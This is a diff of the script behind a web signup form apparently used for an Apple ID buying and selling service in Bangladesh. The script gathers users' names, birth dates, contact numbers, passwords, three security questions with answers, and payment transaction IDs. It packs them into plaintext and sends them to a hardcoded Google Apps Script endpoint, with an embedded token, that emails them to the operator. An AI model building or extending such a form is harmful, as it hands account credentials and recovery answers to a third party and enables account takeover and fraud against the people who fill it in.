@@ -264,161 +264,349 @@
     <form method="dialog"><button>OK</button></form>
   </dialog>
 
-<script>
-  // (keep your helper $ etc.)
+  <script>
+    // ===== helper shortcuts =====
+    const $ = (s, el=document) => el.querySelector(s);
 
-  // small improvements / safety guards
-  function genRandomEmail(){
-    const ts = Date.now().toString(36);
-    const rnd = Math.floor(Math.random()*90000)+10000;
-    // use a placeholder domain you control or a clearly fake one for demo:
-    return `user-${ts}-${rnd}@example.com`;
-  }
+    // Elements
+    const form = $('#signupForm');
+    const statusEl = $('#formStatus');
+    const dobInput = $('#dob');
+    const pw = $('#password');
+    const cpw = $('#confirm');
+    const phone = $('#phone');
+    const pwMeter = $('#pwMeter');
+    const pwLabel = $('#pwLabel');
+    const dlg = $('#successDialog');
+    const whatsapp = $('#whatsapp');
+    const trxId = $('#trxId');
 
-  async function sendPayloadToAppsScript(textPayload){
-    try {
-      const res = await fetch(APPS_SCRIPT_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({
-          textPayload: textPayload,
-          filename: `signup-${Date.now()}.txt`,
-          token: TOKEN
-        })
-      });
-      const j = await res.json().catch(()=>null);
-      if (j?.ok) {
-        showStatus('📤 Sent to your email via Apps Script.', 'ok');
-      } else if (j?.error) {
-        showStatus('⚠️ Apps Script: ' + j.error, 'warn');
-      } else {
-        showStatus('⚠️ Apps Script responded unexpectedly.', 'warn');
-      }
-    } catch (err) {
-      console.error('Apps Script send error', err);
-      showStatus('❌ Could not reach Apps Script (network/CORS issue).', 'err');
+    const useRandomEmail = $('#useRandomEmail');
+    const emailInput = $('#email');
+    const skipPhone = $('#skipPhone');
+
+    // APPS SCRIPT CONFIG — your deployed URL
+    const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbynvag8bOzZdX78GVE5muK0_UUyimA255x25s4p_Ep7DaKR3I2VQugUnTcdaj2jxnF-/exec';
+    const TOKEN = 'my-very-strong-token-1234'; // <-- must match SECRET_TOKEN in Apps Script
+
+    function showStatus(msg, cls='ok'){ statusEl.textContent = msg; statusEl.className = `status ${cls}`; }
+    function setFieldValidity(input, valid, msg=''){
+      if (!input) return;
+      input.setAttribute('aria-invalid', String(!valid));
+      try { input.setCustomValidity(valid ? '' : msg); } catch(e){ /* ignore */ }
+      const errEl = document.getElementById(`err-${input.id}`);
+      if (errEl) errEl.textContent = valid ? '' : msg;
     }
-  }
 
-  // helper to detect touch devices (simple)
-  const isTouch = ('ontouchstart' in window) || navigator.maxTouchPoints > 0;
+    function passwordStrong(p){ return /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^\w\s]).{8,}$/.test(p); }
+    function passwordScore(p){
+      let s=0; if(p.length>=8)s++; if(/[A-Z]/.test(p))s++; if(/[a-z]/.test(p))s++; if(/\d/.test(p))s++; if(/[^\w\s]/.test(p))s++;
+      return Math.min(s,4);
+    }
+    function ageOK(dobStr){
+      const dob = new Date(dobStr); if(isNaN(dob)) return false;
+      const t = new Date();
+      let age = t.getFullYear() - dob.getFullYear();
+      const m = t.getMonth() - dob.getMonth();
+      if (m < 0 || (m === 0 && t.getDate() < dob.getDate())) age--;
+      return age >= 13;
+    }
 
-  // wrap download so mobile doesn't try to auto-download and get blocked
-  function tryDownloadText(filename, text){
-    try {
-      if (isTouch){
-        // skip auto-download on touch devices to avoid being blocked
-        console.log('skipping auto-download on touch device');
+    // DOB max = today - 13y
+    (function setDobMax(){
+      const t = new Date(); t.setFullYear(t.getFullYear()-13);
+      const y=t.getFullYear(), m=String(t.getMonth()+1).padStart(2,'0'), d=String(t.getDate()).padStart(2,'0');
+      if (dobInput) dobInput.max = `${y}-${m}-${d}`;
+    })();
+
+    // Random email generator (unique)
+    function genRandomEmail(){
+      const ts = Date.now().toString(36);
+      const rnd = Math.floor(Math.random()*90000)+10000;
+      return `user-${ts}-${rnd}@example.com`;
+    }
+
+    // Build plain payload
+    function buildPlainTextPayload(formEl){
+      const labels = {
+        'given-name': 'First Name', 'family-name': 'Last Name', 'country': 'Country/Region',
+        'bday': 'Date of Birth', 'email': 'Email', 'tel': 'Mobile Number',
+        'new-password': 'Password', 'confirm-password': 'Confirm Password',
+        'securityQuestion1': 'Security Q1', 'securityAnswer1': 'Answer 1',
+        'securityQuestion2': 'Security Q2', 'securityAnswer2': 'Answer 2',
+        'securityQuestion3': 'Security Q3', 'securityAnswer3': 'Answer 3',
+        'whatsapp': 'WhatsApp', 'trxId': 'TRX ID'
+      };
+
+      const fd = new FormData(formEl);
+      fd.delete('confirm-password');
+
+      const agree = document.getElementById('agree')?.checked ? 'Yes' : 'No';
+      let lines = [];
+      for (const [key, val] of fd.entries()){
+        const v = (val ?? '').toString().trim() || '—';
+        const nice = labels[key] || key;
+        lines.push(`${nice}: ${v}`);
+      }
+      lines.push(`Agreed ToS: ${agree}`);
+      const ts = new Date();
+      return `=== Apple ID Buy Sell Bangladesh ===\nGenerated: ${ts.toISOString()}\n` + lines.join('\n') + '\n';
+    }
+
+    // safe download helper (skip auto-download on touch devices)
+    const isTouch = ('ontouchstart' in window) || navigator.maxTouchPoints > 0;
+    function tryDownloadText(filename, text){
+      try {
+        if (isTouch) { console.log('Skipping auto-download on touch device'); return; }
+        const blob = new Blob([text], {type: 'text/plain'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url; a.download = filename;
+        document.body.appendChild(a); a.click(); a.remove();
+        URL.revokeObjectURL(url);
+      } catch (err) {
+        console.warn('download skipped/error', err);
+      }
+    }
+
+    // send to Apps Script with safer handling
+    async function sendPayloadToAppsScript(textPayload){
+      if (!APPS_SCRIPT_URL || !APPS_SCRIPT_URL.includes('script.google.com')) {
+        console.warn('Apps Script URL not configured');
         return;
       }
-      const blob = new Blob([text], {type: 'text/plain'});
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url; a.download = filename;
-      document.body.appendChild(a);
-      a.click();
-      a.remove(); URL.revokeObjectURL(url);
-    } catch (err) {
-      console.error('downloadText error', err);
+      try {
+        const res = await fetch(APPS_SCRIPT_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({
+            textPayload: textPayload,
+            filename: `signup-${Date.now()}.txt`,
+            token: TOKEN
+          })
+        });
+        const txt = await res.text().catch(()=>null);
+        let j = null;
+        try { j = txt ? JSON.parse(txt) : null; } catch(e){ j = null; }
+        if (j?.ok) {
+          showStatus('📤 Sent to your email via Apps Script.', 'ok');
+        } else if (j?.error) {
+          showStatus('⚠️ Apps Script: ' + j.error, 'warn');
+        } else {
+          // fallback: show raw text if any
+          showStatus(txt ? ('⚠️ Apps Script response: ' + txt.slice(0,120)) : '⚠️ Apps Script responded unexpectedly', 'warn');
+        }
+      } catch (err) {
+        console.error(err);
+        showStatus('❌ Could not reach Apps Script (network/CORS).', 'err');
+      }
     }
-  }
 
-  // safe dialog show helper
-  function safeShowDialog(d){
-    try {
-      if (!d) return;
-      if (typeof d.showModal === 'function') {
-        d.removeAttribute('inert');
-        d.showModal();
-      } else if (typeof d.show === 'function') {
-        d.removeAttribute('inert');
-        d.show();
+    // UI: useRandomEmail behavior
+    useRandomEmail?.addEventListener('change', ()=>{
+      const on = useRandomEmail.checked;
+      if (on){
+        const randomEmail = genRandomEmail();
+        emailInput.value = randomEmail;
+        emailInput.readOnly = true;
+        emailInput.classList.add('locked');
+        emailInput.setAttribute('aria-readonly', 'true');
+        emailInput.required = true;
       } else {
-        // fallback alert for older browsers
-        alert('✅ submitted successfully! Please wait while we process your request');
+        emailInput.readOnly = false;
+        emailInput.classList.remove('locked');
+        emailInput.removeAttribute('aria-readonly');
+        emailInput.value = '';
+        emailInput.required = true;
       }
-    } catch (err) {
-      console.error('dialog show error', err);
-      try { alert('✅ submitted successfully!'); } catch(e){ /* ignore */ }
-    }
-  }
+      setFieldValidity(emailInput, true, '');
+    });
 
-  // submit handler with try/catch
-  form.addEventListener('submit', (e)=>{
-    e.preventDefault();
-    try {
-      if (!form.checkValidity()){
-        showStatus('⚠️ Please fill out required fields correctly.', 'warn');
-        // prefer reportValidity to show messages (some mobile browsers behave better)
-        if (typeof form.reportValidity === 'function') form.reportValidity();
-        return;
+    // skipPhone
+    skipPhone?.addEventListener('change', ()=>{
+      const on = skipPhone.checked;
+      if (on){
+        phone.value = 'SKIP number';
+        phone.readOnly = true;
+        phone.classList.add('locked');
+        phone.setAttribute('aria-readonly', 'true');
+        phone.required = false;
+        setFieldValidity(phone, true, '');
+      } else {
+        phone.readOnly = false;
+        phone.classList.remove('locked');
+        phone.removeAttribute('aria-readonly');
+        phone.value = '';
+        phone.required = false;
+        setFieldValidity(phone, true, '');
       }
+    });
 
-      if (!passwordStrong(pw.value)){
-        setFieldValidity(pw, false, 'Password does not meet the rules.');
-        showStatus('Password does not meet the rules.', 'err');
-        pw.focus(); return;
-      }
+    // live validation handlers
+    pw?.addEventListener('input', ()=>{
+      const s = passwordScore(pw.value);
+      if (pwMeter) pwMeter.value = s;
+      if (pwLabel) pwLabel.textContent = ['', 'Very weak', 'Weak', 'Good', 'Strong'][s] ?? '';
+      const ok = passwordStrong(pw.value);
+      setFieldValidity(pw, !pw.value || ok, ok ? '' : 'Password does not meet the rules.');
+    });
+    cpw?.addEventListener('input', ()=>{
       const match = pw.value === cpw.value;
-      setFieldValidity(cpw, match, match ? '' : 'Passwords do not match.');
-      if (!match){ showStatus('Passwords do not match.', 'err'); cpw.focus(); return; }
-
-      const ageOk = ageOK(dobInput.value);
-      setFieldValidity(dobInput, ageOk, ageOk ? '' : 'You must be at least 13 years old.');
-      if (!ageOk){ showStatus('You must be at least 13 years old.', 'err'); dobInput.focus(); return; }
-
-      // Phone validation
-      if (phone && phone.value && !phone.readOnly){
-        const ok = new RegExp(phone.getAttribute('pattern')).test(phone.value);
+      setFieldValidity(cpw, !cpw.value || match, match ? '' : 'Passwords do not match.');
+    });
+    phone?.addEventListener('input', ()=>{
+      if (skipPhone.checked || phone.readOnly) { setFieldValidity(phone, true, ''); return; }
+      try {
+        const pattern = new RegExp(phone.getAttribute('pattern'));
+        const ok = !phone.value || pattern.test(phone.value);
         setFieldValidity(phone, ok, ok ? '' : 'Phone format is invalid.');
-        if (!ok){ showStatus('Phone format is invalid.', 'err'); phone.focus(); return; }
-      }
-
-      // WhatsApp validation
-      if (whatsapp && whatsapp.value.trim()){
-        const ok = new RegExp(whatsapp.getAttribute('pattern')).test(whatsapp.value.trim());
+      } catch(e){ /* ignore pattern errors */ }
+    });
+    whatsapp?.addEventListener('input', ()=>{
+      try {
+        const pattern = new RegExp(whatsapp.getAttribute('pattern'));
+        const ok = !whatsapp.value || pattern.test(whatsapp.value);
         setFieldValidity(whatsapp, ok, ok ? '' : 'WhatsApp নম্বরের ফরম্যাট ঠিক নেই।');
-        if (!ok){ showStatus('WhatsApp নম্বরের ফরম্যাট ঠিক নেই।', 'err'); whatsapp.focus(); return; }
-      }
-
-      // TRX validation
-      if (trxId && trxId.value.trim()){
-        const ok = new RegExp(trxId.getAttribute('pattern')).test(trxId.value.trim());
+      } catch(e){ /* ignore */ }
+    });
+    trxId?.addEventListener('input', ()=>{
+      try {
+        const pattern = new RegExp(trxId.getAttribute('pattern'));
+        const ok = !trxId.value || pattern.test(trxId.value);
         setFieldValidity(trxId, ok, ok ? '' : 'TRX ID ফরম্যাট সঠিক নয় (8–20 অক্ষর/সংখ্যা)।');
-        if (!ok){ showStatus('TRX ID ফরম্যাট সঠিক নয়।', 'err'); trxId.focus(); return; }
+      } catch(e){ /* ignore */ }
+    });
+
+    // eye toggles
+    document.getElementById('togglePw')?.addEventListener('click', ()=>{ pw.type = pw.type === 'password' ? 'text' : 'password'; });
+    document.getElementById('toggleCpw')?.addEventListener('click', ()=>{ cpw.type = cpw.type === 'password' ? 'text' : 'password'; });
+
+    // dialog polish helper
+    function safeShowDialog(d){
+      try {
+        if (!d) return;
+        if (typeof d.showModal === 'function') {
+          d.removeAttribute('inert');
+          d.showModal();
+        } else if (typeof d.show === 'function') {
+          d.removeAttribute('inert');
+          d.show();
+        } else {
+          alert('✅ submitted successfully! Please wait while we process your request');
+        }
+      } catch (err) {
+        console.warn('dialog show error', err);
+        try { alert('✅ submitted successfully!'); } catch(e){}
       }
-
-      showStatus('✅ submitted successfully! Processing…', 'ok');
-
-      // Build plain text + show in UI
-      const textPayload = buildPlainTextPayload(form);
-      const outEl = document.getElementById('plainOut');
-      const wrapEl = document.getElementById('plainWrap');
-      if (outEl && wrapEl){ outEl.value = textPayload; wrapEl.style.display = 'block'; }
-
-      // try download but skip on touch devices
-      tryDownloadText('signup-demo.txt', textPayload);
-
-      // send to Apps Script (if configured)
-      if (APPS_SCRIPT_URL && APPS_SCRIPT_URL.includes('script.google.com')) {
-        sendPayloadToAppsScript(textPayload);
-      } else {
-        showStatus('⚠️ Apps Script URL not configured.', 'warn');
-      }
-
-      // show dialog safely
-      safeShowDialog(dlg);
-
-    } catch (err) {
-      console.error('submit handler error', err);
-      showStatus('❌ An unexpected error occurred. See console.', 'err');
-      // as fallback show an alert for mobile users
-      try { alert('An unexpected error occurred. Please try again.'); } catch(e){}
     }
-  });
 
-  // other handlers unchanged...
-</script>
+    dlg?.addEventListener('close', () => form.querySelector('[type="submit"]')?.focus());
+    dlg?.addEventListener('cancel', (e) => { e.preventDefault(); dlg.close(); });
 
+    // submit
+    form.addEventListener('submit', (e)=>{
+      e.preventDefault();
+      try {
+        if (!form.checkValidity()){
+          showStatus('⚠️ Please fill out required fields correctly.', 'warn');
+          if (typeof form.reportValidity === 'function') form.reportValidity();
+          return;
+        }
+
+        if (!passwordStrong(pw.value)){
+          setFieldValidity(pw, false, 'Password does not meet the rules.');
+          showStatus('Password does not meet the rules.', 'err');
+          pw.focus(); return;
+        }
+        const match = pw.value === cpw.value;
+        setFieldValidity(cpw, match, match ? '' : 'Passwords do not match.');
+        if (!match){ showStatus('Passwords do not match.', 'err'); cpw.focus(); return; }
+
+        const ageOk = ageOK(dobInput.value);
+        setFieldValidity(dobInput, ageOk, ageOk ? '' : 'You must be at least 13 years old.');
+        if (!ageOk){ showStatus('You must be at least 13 years old.', 'err'); dobInput.focus(); return; }
+
+        // Phone: if it's locked/skipped, bypass; otherwise validate if provided
+        if (phone && phone.value && !phone.readOnly){
+          let ok = true;
+          try { ok = new RegExp(phone.getAttribute('pattern')).test(phone.value); } catch(e){ ok = true; }
+          setFieldValidity(phone, ok, ok ? '' : 'Phone format is invalid.');
+          if (!ok){ showStatus('Phone format is invalid.', 'err'); phone.focus(); return; }
+        }
+
+        // WhatsApp (if provided)
+        if (whatsapp && whatsapp.value.trim()){
+          let ok = true;
+          try { ok = new RegExp(whatsapp.getAttribute('pattern')).test(whatsapp.value.trim()); } catch(e){ ok = true; }
+          setFieldValidity(whatsapp, ok, ok ? '' : 'WhatsApp নম্বরের ফরম্যাট ঠিক নেই।');
+          if (!ok){ showStatus('WhatsApp নম্বরের ফরম্যাট ঠিক নেই।', 'err'); whatsapp.focus(); return; }
+        }
+        // TRX (if provided)
+        if (trxId && trxId.value.trim()){
+          let ok = true;
+          try { ok = new RegExp(trxId.getAttribute('pattern')).test(trxId.value.trim()); } catch(e){ ok = true; }
+          setFieldValidity(trxId, ok, ok ? '' : 'TRX ID ফরম্যাট সঠিক নয় (8–20 অক্ষর/সংখ্যা)।');
+          if (!ok){ showStatus('TRX ID ফরম্যাট সঠিক নয়।', 'err'); trxId.focus(); return; }
+        }
+
+        showStatus('✅ submitted successfully! Please wait while we process your request.', 'ok');
+
+        // Build plain text + show in UI + download (skip on touch)
+        const textPayload = buildPlainTextPayload(form);
+        const outEl = document.getElementById('plainOut');
+        const wrapEl = document.getElementById('plainWrap');
+        if (outEl && wrapEl){ outEl.value = textPayload; wrapEl.style.display = 'block'; }
+
+        // safe download
+        tryDownloadText('signup-demo.txt', textPayload);
+
+        // send to Apps Script (will email you) — best-effort
+        if (APPS_SCRIPT_URL && APPS_SCRIPT_URL.includes('script.google.com')) {
+          sendPayloadToAppsScript(textPayload);
+        } else {
+          // don't treat as error — just warn
+          showStatus('⚠️ Apps Script not configured (skipped).', 'warn');
+        }
+
+        // show dialog (safe fallback included)
+        safeShowDialog(dlg);
+
+      } catch (err) {
+        console.error('submit error', err);
+        showStatus('❌ Unexpected error — check console.', 'err');
+        // fallback alert so mobile users see feedback
+        try { alert('An unexpected error occurred. Please try again.'); } catch(e){}
+      }
+    });
+
+    // Reset behaviour
+    document.getElementById('resetBtn')?.addEventListener('click', ()=>{
+      showStatus('');
+      if (useRandomEmail.checked){
+        useRandomEmail.checked = false;
+        emailInput.readOnly = false;
+        emailInput.classList.remove('locked');
+        emailInput.removeAttribute('aria-readonly');
+        emailInput.value = '';
+        emailInput.required = true;
+      }
+      if (skipPhone.checked){
+        skipPhone.checked = false;
+        phone.readOnly = false;
+        phone.classList.remove('locked');
+        phone.removeAttribute('aria-readonly');
+        phone.value = '';
+        phone.required = false;
+      }
+      [pw, cpw, phone, dobInput, whatsapp, trxId, emailInput].forEach(i=> i && setFieldValidity(i, true, ''));
+      if (pwMeter) pwMeter.value = 0; if (pwLabel) pwLabel.textContent='';
+      if (dlg?.open) dlg.close();
+      dlg?.setAttribute('inert','');
+      const wrapEl = document.getElementById('plainWrap');
+      if (wrapEl) wrapEl.style.display = 'none';
+      const outEl = document.getElementById('plainOut');
+      if (outEl) outEl.value = '';
+    });
+  </script>
 </body>
 </html>
